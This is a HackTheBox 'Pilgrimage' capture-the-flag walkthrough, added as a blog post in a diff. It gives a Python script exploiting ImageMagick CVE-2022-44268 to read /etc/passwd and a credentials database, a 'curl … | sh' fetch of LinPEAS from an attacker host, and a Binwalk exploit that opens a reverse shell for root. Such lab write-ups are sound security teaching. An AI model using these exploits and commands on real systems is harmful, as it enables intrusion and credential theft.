@@ -1,0 +1,344 @@
+---
+title: "Pilgrimage"
+publishedAt: "2024-10-11"
+image: "/images/blog/pilgrimage/htb_pilgrimage.png"
+summary: "A detailed walkthrough of the Pilgrimage HackTheBox machine, featuring a web application with an exposed .git repository. The writeup covers exploiting an ImageMagick vulnerability (CVE-2022-44268) to read sensitive files, gaining initial access as user Emily, and escalating privileges through a vulnerable Binwalk process."
+tag: "HackTheBox"
+---
+
+## Initial Setup
+
+Update your `/etc/hosts` with the entry for `pilgrimage.htb`.
+
+## Initial Reconnaissance
+
+Start a scan with [AutoRecon](https://github.com/Tib3rius/AutoRecon).
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'autorecon pilgrimage.htb -v',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+From the `tcp_80_http_feroxbuster_dirbuster` output, we notice that a `.git` repository is present.
+
+## Web Vulnerability Exploration
+
+To exploit the `.git` repository and pull more information, install and run `git-dumper`.
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'pip install git-dumper',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: '~/.local/bin/git-dumper http://pilgrimage.htb/.git/ git',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+From the extracted files, an executable named `magick` is spotted. When running this executable with the `-version` argument:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: './magick -version',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+We find out that the software version is `ImageMagick 7.1.0-49`. A quick search reveals a vulnerability for this version: [CVE Details](https://github.com/voidz0r/CVE-2022-44268).
+
+Clone the repository related to the CVE and proceed.
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'git clone https://github.com/voidz0r/CVE-2022-44268',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'git clone https://github.com/voidz0r/CVE-2022-44268',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+I also made a Python script to make the process easier: 
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: `import re
+import sys
+import requests
+import subprocess
+import argparse
+from urllib.parse import urlparse, parse_qs
+
+def extract_hex_data(data):
+    regex_pattern = r"^([0-9a-fA-F]+\n)+$"
+    match = re.search(regex_pattern, data, re.MULTILINE)
+    return match.group(0) if match else None
+
+def download_image_from_url(url):
+    response = requests.get(url, stream=True)
+    with open('output.png', 'wb') as file:
+        for chunk in response.iter_content(chunk_size=8192): 
+            file.write(chunk)
+
+def run_cargo(arg):
+    command = ["cargo", "run", arg]
+    subprocess.run(command, stdout=subprocess.DEVNULL)
+
+def convert_image_and_upload():
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate',
+        'Connection': 'close',
+    }
+
+    with open('image.png', 'rb') as f:
+        files = {'toConvert': ('image.png', f, 'image/png')}
+        response = requests.post(BASE_URL, headers=headers, files=files)
+        parsed_url = urlparse(response.url)
+        params = parse_qs(parsed_url.query)
+        return params['message'][0]
+
+def identify_image():
+    command = ["./magick", "identify", "-verbose", "output.png"]
+    result = subprocess.run(command, capture_output=True, text=True)
+    return result.stdout
+
+def main():
+    parser = argparse.ArgumentParser(description="Process and send an image to a server.")
+    parser.add_argument('-i', '--input_arg', help='Argument for the cargo command.')
+    parser.add_argument('-u', '--url', default="http://pilgrimage.htb/", help='Base URL for the service. Default: http://pilgrimage.htb/')
+
+    args = parser.parse_args()
+    arg = args.input_arg
+    global BASE_URL
+    BASE_URL = args.url
+
+    # Run the cargo command
+    run_cargo(arg)
+    
+    # Convert the image and upload
+    image_url = convert_image_and_upload()
+    
+    # Download the image from the returned URL
+    download_image_from_url(image_url)
+
+    # Identify the image
+    data = identify_image()
+    result = extract_hex_data(data)
+    
+    if result:
+        print(bytes.fromhex(result))
+    else:
+        print("No sequence found.")
+
+if __name__ == "__main__":
+    main()`,
+            language: 'python'
+        },
+    ]}
+    copyButton
+/>
+
+Test the PoC command with the following:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'python auto_pilgrim.py -i "/etc/passwd"',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Revert back to the folder extracted from the git dump. After analyzing the files, we notice that it tries to fetch database credentials from `/var/db/pilgrimage` as seen in `dashboard.php`.
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'python auto_pilgrim.py -i "/var/db/pilgrimage"',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+This command returns the password for the user Emily.
+
+## Privilege Escalation
+
+On your own machine, download LinPEAS for further enumeration:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'wget https://github.com/carlospolop/PEASS-ng/releases/latest',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Start a local web server:
+
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'sudo python3 -m http.server 80',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Use the fetched password to SSH as Emily.
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'ssh emily@[BOX_IP]',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+And from Emily's shell:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'curl http://[YOUR_IP]/linpeas.sh | sh',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+
+LinPEAS points to `user.txt` for the first flag and also highlights an interesting process: `/usr/sbin/malwarescan.sh`.
+On reading the shell script:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'cat /usr/sbin/malwarescan.sh',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+We find out it uses `binwalk`, especially `Binwalk v2.3.2` that is vulnerable as showcased by [this exploit](https://www.exploit-db.com/exploits/51249).
+
+Use the exploit script with a random image:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'python exploit.py random_image.png [YOUR_IP] [YOUR_PORT]',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Start a Python webserver so that we can download the image from Emily's shell :
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'sudo python3 -m http.server 80',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+On Emily's shell, fetch the image:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'wget http://[YOUR_IP]/binwalk_exploit.png',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Once malwarescan.sh triggers the exploit, verify that you are root:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'whoami',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Now find and display the root flag:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: `find / -type f -name root.txt 2>/dev/null 
+cat /root/root.txt`,
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Happy rooting :-)
